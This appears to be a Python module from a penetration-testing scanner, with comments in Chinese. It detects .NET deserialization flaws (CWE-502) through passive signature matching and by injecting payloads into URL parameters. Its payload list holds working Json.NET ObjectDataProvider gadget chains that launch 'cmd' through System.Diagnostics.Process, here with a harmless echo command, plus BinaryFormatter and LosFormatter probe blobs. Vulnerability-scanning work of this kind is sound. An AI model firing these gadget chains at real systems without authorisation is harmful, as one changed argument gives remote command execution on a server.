# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# engines/dotnet_deserialization.py
"""
.NET 反序列化漏洞检测引擎（CWE-502）。

检测 .NET 反序列化漏洞，包括：
- BinaryFormatter、LosFormatter、ObjectStateFormatter
- JavaScriptSerializer、DataContractSerializer
- TypeNameHandling.Auto（Newtonsoft.Json）
- ActivitySurrogateSelector、ClaimsPrincipal 等 Gadget

工作方式：
1. 被动检测：扫描响应中是否包含 .NET 反序列化相关特征（ViewState、序列化框架引用等）；
2. 主动检测：对可注入参数发送 .NET 反序列化 Payload，观察错误回显。
"""
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

from vulnclaw.core.logger import logger
from vulnclaw.config import settings
from vulnclaw.core.utils import async_get, build_attack_url
from vulnclaw.engines.base import BaseEngine


class DotNetDeserializationEngine(BaseEngine):
    name = "dotnet_deserialization"
    description = ".NET 反序列化漏洞检测（CWE-502）：BinaryFormatter / LosFormatter / Json.NET 等"
    enabled = True
    max_payloads = 8

    # v102: PAYLOADS from unified pool (core/data/payload_pool.yaml)
    def __init__(self):
        super().__init__()
        try:
            from vulnclaw.core.payload_pool import PayloadPool
            pooled = PayloadPool.load("dotnet_deserialization")
            if pooled:
                self.PAYLOADS = pooled
        except Exception:
            logger.debug("suppressed exception (engine audit)")

    # ---------------- 被动特征 ----------------
    DOTNET_INDICATORS: List[Tuple[str, str]] = [
        (r'BinaryFormatter', 'BinaryFormatter 反序列化'),
        (r'LosFormatter', 'LosFormatter 反序列化'),
        (r'ObjectStateFormatter', 'ObjectStateFormatter 反序列化'),
        (r'NetDataContractSerializer', 'NetDataContractSerializer 反序列化'),
        (r'DataContractSerializer', 'DataContractSerializer 反序列化'),
        (r'JavaScriptSerializer', 'JavaScriptSerializer 反序列化'),
        (r'SoapFormatter', 'SoapFormatter 反序列化'),
        (r'TypeNameHandling\.Auto', 'Newtonsoft.Json TypeNameHandling.Auto'),
        (r'TypeNameHandling\.Objects', 'Newtonsoft.Json TypeNameHandling.Objects'),
        (r'TypeNameHandling\.All', 'Newtonsoft.Json TypeNameHandling.All'),
        (r'__type\s*[":=]\s*"[A-Za-z_.]+', 'Json.NET $type 反序列化'),
        (r'ActivitySurrogateSelector', 'ActivitySurrogateSelector Gadget'),
        (r'ClaimsPrincipal', 'ClaimsPrincipal Gadget'),
        (r'TextFormattingRunProperties', 'TextFormattingRunProperties Gadget'),
        (r'WindowsIdentity', 'WindowsIdentity Gadget'),
        (r'System\.Windows\.Data\.ObjectDataProvider', 'ObjectDataProvider Gadget'),
        (r'System\.Configuration\.Install\.AssemblyInstaller', 'AssemblyInstaller Gadget'),
        (r'System\.Web\.UI\.LosFormatter', 'LosFormatter WebForms 序列化'),
        (r'__VIEWSTATE', 'ASP.NET ViewState'),
        (r'__EVENTVALIDATION', 'ASP.NET EventValidation'),
        (r'__VIEWSTATEGENERATOR', 'ASP.NET ViewStateGenerator'),
    ]

    # ---------------- 主动 Payload ----------------
    PAYLOADS: List[Tuple[str, str]] = [
        (
            '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","$values":["cmd","/c echo deser_test"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}',
            'Json.NET ObjectDataProvider 反序列化'
        ),
        (
            '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c echo test"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}',
            'Json.NET ObjectDataProvider 简化版'
        ),
        (
            '{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo deser_test"}}}',
            'Json.NET __type 反序列化'
        ),
        (
            '/wEy0gAAAHBTTUVYAQAAAEQAAABTWVNURU0uV0VCLlVJLkxPU0ZPUk1BVEVSLFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iMDNmNWY3ZjExZDUwYTNhDgAAACFTWVNURU0uV0VCLlVJLiBMb3NGb3JtYXRlcgEAAAAEVGhpcyBpcyBhIHRlc3QgcGF5bG9hZA==',
            'LosFormatter ViewState Payload'
        ),
        (
            'AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAAA=',
            'BinaryFormatter ObjectDataProvider 探测'
        ),
        (
            '{"$type":"System.Security.Claims.ClaimsPrincipal, System.Security.Claims","Identities":{"$type":"System.Collections.Generic.List`1[[System.Security.Claims.ClaimsIdentity, System.Security.Claims]], mscorlib","$values":[{"$type":"System.Security.Claims.ClaimsIdentity, System.Security.Claims"}]}}',
            'ClaimsPrincipal Gadget 探测'
        ),
        (
            '{"$type":"System.Activities.Presentation.PropertyEditing.PropertyValue, System.Activities.Presentation","PropertyName":"test"}',
            'ActivitySurrogateSelector Gadget 探测'
        ),
        (
            '{"$type":"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.VisualStudio.Text.Formatting","ForegroundBrush":"test"}',
            'TextFormattingRunProperties Gadget 探测'
        ),
    ]

    # ---------------- 错误回显 ----------------
    DOTNET_ERROR_SIGS = [
        r'System\.Runtime\.Serialization',
        r'SerializationException',
        r'ObjectDataProvider',
        r'BinaryFormatter',
        r'LosFormatter',
        r'ObjectStateFormatter',
        r'JsonSerializationException',
        r'JsonReaderException',
        r'TypeNameHandling',
        r'__type.*not resolved',
        r'Unable to find assembly',
        r'Cannot resolve type',
        r'Method not found',
        r'PresentationFramework',
        r'mscorlib.*Version',
        r'System\.Diagnostics\.Process',
        r'FormatException.*ViewState',
        r'Invalid viewstate',
        r'Invalid_ViewState',
        r'Exception has been thrown by the target of an invocation',
        r'at System\.',
        r'at Microsoft\.',
    ]

    # ---------------- 实现 ----------------

    def _passive_check(self, blob: str, source: str) -> List[Dict]:
        hits = []
        if not blob:
            return hits
        for pattern, desc in self.DOTNET_INDICATORS:
            if re.search(pattern, blob, flags=re.IGNORECASE):
                hits.append({"desc": desc, "source": source})
        return hits

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        import asyncio  # H.2: top3 热路径线程池隔离
        findings: List[Dict] = []
        timeout = getattr(settings, 'timeout', 30)
        logger.info(f"[DotNetDeserialization] 检测 .NET 反序列化特征 (CWE-502): {target}")

        parsed = urlparse(target)

        # ---- 1. 被动检测 ----
        try:
            resp = await async_get(target, session=session, timeout=timeout)
            if isinstance(resp, tuple) and len(resp) >= 2:
                _status, text = resp[0], resp[1] or ""
                headers = resp[2] if len(resp) > 2 else {}
            else:
                _status, text = getattr(resp, 'status', 0), str(resp)
                headers = {}
            headers_str = "\n".join(f"{k}: {v}" for k, v in (headers or {}).items())
        except Exception as e:
            logger.debug(f"[DotNetDeserialization] 目标请求失败: {e}")
            return findings

        blob = f"{text}\n{headers_str}"
        hits = await asyncio.to_thread(self._passive_check, blob, "响应/头")

        for key, values in parse_qs_lite(parsed.query).items():
            for v in values:
                hits += await asyncio.to_thread(self._passive_check, v, f"URL 参数 {key}")

        seen = set()
        for hit in hits:
            dedup_key = hit["desc"]
            if dedup_key in seen:
                continue
            seen.add(dedup_key)
            findings.append({
                'url': target,
                'type': f'.NET 反序列化特征-{hit["desc"]}',
                'severity': 'Medium',
                'ai_verdict': '中',
                'evidence': f'在{hit["source"]}中发现 .NET 反序列化特征: {hit["desc"]}',
                'method': 'dotnet_deserialization',
            })
            logger.info(f"[DotNetDeserialization] 被动命中: {hit['desc']} ({hit['source']})")

        # ---- 2. 主动检测 ----
        params = parse_qs_lite(parsed.query)
        if params:
            from vulnclaw.core.scanner import safe_request
            for param, values in params.items():
                if not values:
                    continue
                for payload, desc in self.PAYLOADS:
                    try:
                        test_url = build_attack_url(target, param, payload, parsed.query)
                        resp_a = await safe_request(test_url, session, method="GET", timeout=timeout)
                        if resp_a is None:
                            continue
                        resp_text = resp_a[1] if isinstance(resp_a, tuple) else str(resp_a)
                        if not isinstance(resp_text, str):
                            continue
                        # K3: 反射失真守卫——payload 原样回显（含 HTML 转义后）判定为反射，
                        # 不构成"反序列化错误回显"（真实错误栈只回显类型名片段，不回显完整 JSON）。
                        if self._match_error_sig(resp_text, payload):
                            findings.append({
                                'url': test_url,
                                'parameter': param,
                                'payload': payload[:100],
                                'type': f'.NET 反序列化注入-{desc}',
                                'severity': 'High',
                                'ai_verdict': '高',
                                'evidence': f'参数 {param} 注入 {desc} 后出现 .NET 反序列化错误回显',
                                'method': 'dotnet_deserialization',
                            })
                            logger.info(f"[DotNetDeserialization] 主动命中: {param} -> {desc}")
                            break
                    except Exception as e:
                        logger.debug(f"[DotNetDeserialization] Payload 测试失败: {e}")

        logger.info(f"[DotNetDeserialization] 完成，发现 {len(findings)} 个 .NET 反序列化特征")
        return findings

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        timeout = getattr(settings, 'timeout', 30)

        from vulnclaw.core.scanner import safe_request
        for payload, desc in self.PAYLOADS:
            try:
                test_url = build_attack_url(url, param, payload, parsed_query)
                resp = await safe_request(test_url, session, method="GET", timeout=timeout)
                if resp is None:
                    continue
                resp_text = resp[1] if isinstance(resp, tuple) else str(resp)
                if not isinstance(resp_text, str):
                    continue
                # K3: 反射失真守卫——payload 原样回显（含 HTML 转义后）判定为反射，
                # 不构成"反序列化错误回显"（真实错误栈只回显类型名片段，不回显完整 JSON）。
                if self._match_error_sig(resp_text, payload):
                    return {
                        'url': test_url,
                        'parameter': param,
                        'payload': payload[:100],
                        'type': f'.NET 反序列化注入-{desc}',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f'参数 {param} 注入 {desc} 后出现 .NET 反序列化错误回显',
                        'method': 'dotnet_deserialization',
                    }
            except Exception as e:
                logger.debug(f"[DotNetDeserialization] check 失败: {e}")
        return None

    def _match_error_sig(self, resp_text: str, payload: str = "") -> bool:
        # K3: 反射失真剔除——若命中签名也出现在 payload 自身（如 ObjectDataProvider/
        # PresentationFramework/Process 等类型名），要求"响应出现次数 > payload 出现次数"，
        # 否则判定该次命中只是 payload 被反射回显（真实异常栈的类型名片段不会由
        # 完整 JSON 携带，次数差保持成立；纯反射时次数相等 → 判不命中）。
        for sig in self.DOTNET_ERROR_SIGS:
            if not re.search(sig, resp_text, flags=re.IGNORECASE):
                continue
            if not payload:
                return True
            m = re.search(sig, payload, flags=re.IGNORECASE)
            if not m:
                return True
            _resp_n = len(re.findall(sig, resp_text, flags=re.IGNORECASE))
            _pay_n = len(re.findall(sig, payload, flags=re.IGNORECASE))
            if _resp_n > _pay_n:
                return True
        return False


def parse_qs_lite(qs: str) -> Dict[str, List[str]]:
    from urllib.parse import parse_qs
    if not qs:
        return {}
    return parse_qs(qs, keep_blank_values=True)


__all__ = ['DotNetDeserializationEngine']